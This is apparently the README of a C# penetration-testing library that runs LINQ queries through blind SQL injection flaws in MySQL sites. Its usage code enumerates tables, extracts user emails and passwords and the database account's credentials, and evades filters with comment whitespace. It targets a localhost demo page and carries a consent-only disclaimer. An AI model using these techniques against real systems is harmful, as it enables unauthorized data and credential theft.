# Execute LINQ queries through SQL Injection vulnerabilities

> The sharpest tool for SQL Injection.

This is a tool for penetration testers to support manual analysis of SQL injection vulnerabilities. It provides a way to query data through a vulnerability using LINQ like the data were in a regular database. Since queries are expressed as expression trees, the translation of them can be fine-tuned in to every detail.

It also serves educational purposes on LINQ, Expression Trees and Query Providers.

**It is not intended to test or attack any target without prior mutual consent.** See Disclaimer below.

## Usage

Set up services:

```csharp
IServiceCollection services = new ServiceCollection();
services.AddLogging(options => options.AddConsole().SetMinimumLevel(LogLevel.Trace));
services.AddSqlInjection(
    database => database.UseMySql(),
    attack => attack.UseErrorBased(
        builder => builder.Create("http://localhost/vulnerable.php")
            .IntoQueryStringParameter("id", initialValue: 1),
        errorProvider => errorProvider.UseExponentiationOverflow(),
        errorDetection => errorDetection.UsePhp()
    )
);

IServiceProvider provider = services.BuildServiceProvider();
```

Getting the attack:

```csharp
var injection = provider.GetRequiredService<BlindSqlInjection>();
```

Running queries:

```csharp
// get database name
var database = await injection.Context.GetDatabaseNameAsync();

// find users table
var usersTable = await injection.Context.InformationSchema.Tables
    .Where(t => t.Schema == database)
    .Where(t => t.Name.Like("%user%"))
    .Select(t => t.Name)
    .FirstAsync();

// acquire the e-mail of the first registered user
var email = await injection.Context.Current.GetTable(usersTable)
    .OrderBy(d => d["id"])
    .Select(d => d["email"])
    .FirstAsync(estimatedLength: 20);

// acquire the password
var password = await injection.Context.Current.GetTable(usersTable)
    .OrderBy(d => d["id"])
    .Where(d => d["email"] == email)
    .Select(d => d["password"])
    .FirstAsync(estimatedLength: 40);
```

## Set up an attack

### Time-based blind attacks
You can configure the exact timings for a time attack:

```csharp
services.AddSqlInjection(
    database => database.UseMySql(),
    attack => attack.UseTimeBased(
        builder => builder.Create(...),
        new TimeBasedBlindSqlInjectionOptions
        {
            InjectedWaitTime = TimeSpan.FromMilliseconds(1000),
            SuccessfulTime = TimeSpan.FromMilliseconds(500),
        }
    )
);
```

### Error-based blind attacks
You can configure how to raise errors and how to detect them:

```csharp
services.AddSqlInjection(
    database => database.UseMySql(),
    attack => attack.UseErrorBased(
        builder => builder.Create(...),
        errorProvider => errorProvider.UseExponentiationOverflow(),
        errorDetection => errorDetection.UsePhp()
    )
);
```

### Boolean-based blind attacks

You have to implement your own boolean-based hypothesis tester:

```csharp
class CustomHypothesisTester : IHypothesisTester
{
    public Task<bool> TestAsync(IQueryable<bool> query)
    {
        // ...
    }
}
```

And then you can register it as an attack:

```csharp
services.AddSqlInjection(
    database => database.UseMySql(),
    attack => attack.UseBooleanBased<CustomHypothesisTester>()
);
```

## Set up the injector function

This is the function which injects the generated SQL queries into the vulnerable system. For most cases, you can use the built-in builder:

```csharp
attack => attack.UseTimeBased(
    builder => builder.Create("http://localhost/vulnerable.php")
        
        // location
        .IntoRouteParameter(initialValue: "slug")
        .IntoQueryStringParameter("id", initialValue: 1)
        .IntoForm("firstName")

        // value type, if no initial value was provided
        .AsString()
        .AsInteger()

        // HTTP method
        .UseGet()
        .UsePost()
        .UseHttpMethod(HttpMethod.Put)
)
```

If you can't build the injection function using the built-in configurations, you can build your own by implementing the corresponding interfaces:


```csharp
class CustomInjector : IErrorBasedInjector
{
    public CustomInjector(HttpClient http) { /*...*/ }

    public Task<HttpResponseMessage> InjectAsync(string sql, CancellationToken cancellationToken)
    {
        return Http.GetAsync(/*...*/);
    }
}
```

## The data context

### Current database

You can access the current database from the data context like this:

```csharp
var users = injection.Context.Current.GetTable("users")
    .OrderBy(u => u["email"])
    .Select(u => u["email"])
    .ToListAsync();
```

Since the schema of every database can be different, entities are dynamic. You can access columns by providing their names are string. To differentiate between types, you can use the following functions of `DynamicEntity`:

```csharp
.OrderBy(u => u["email"]) // string
.OrderBy(u => u.Value<string>("email")) // string
.OrderBy(u => u.Value<int>("id")) // int
```

### Another database

You can access any database through the data context by calling `injection.Context.GetDatabase("name")`.

### Information schema

For example, you can list tables names like this:

```csharp
var database = await injection.Context.GetDatabaseNameAsync();
var tables = await injection.Context.InformationSchema.Tables
    .Where(t => t.Schema == database)
    .OrderBy(t => t.Name)
    .Select(t => t.Name)
    .ToListAsync();
```

### MySQL database

You can query users that are allowed to connect from anywhere:

```csharp
var users = await injection.Context.MySql.User
    .Where(t => t.Host == "%")
    .Where(t => t.AccountLocked == false)
    .Select(t => t.Name)
    .ToListAsync();
```

You can also get the credentials of the current database user:

```csharp
var user = await injection.Context.MySql.GetDatabaseUserNameAsync();
var password = await injection.Context.MySql.GetDatabasePasswordAsync();
```

## Functions

You can import MySQL functions:

```csharp
using static MySqlFunctions;
```

And then you can easily access them in a query:

```csharp
.Select(d => If(Ascii(Substring(Database(), 1, 1)).Between(97, 122), null, Sleep(1)))
```

## Altering query format
You can create and register your own SQL writer:

```csharp
services.AddScoped<SqlWriter, CustomSqlWriter>();
```

#### Change quotes for string literals

```cs
class CustomSqlWriter : MySqlWriter
{
    public override void WriteString(string str) => Write($"\"{Escape(str)}\"");
}
```

#### Omit optional white-space

```csharp
class CustomSqlWriter : MySqlWriter
{
    public override void WriteOptionalWhiteSpace() { };
}
```

#### Replace white-space with comments

```csharp
class CustomSqlWriter : MySqlWriter
{
    public override void WriteWhiteSpace() => Write("/**/");
}
```

## Limitations
 - Only MySQL is supported.
 - Translation of advanced queries (joins, group by) are not supported.

## Disclaimer

Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.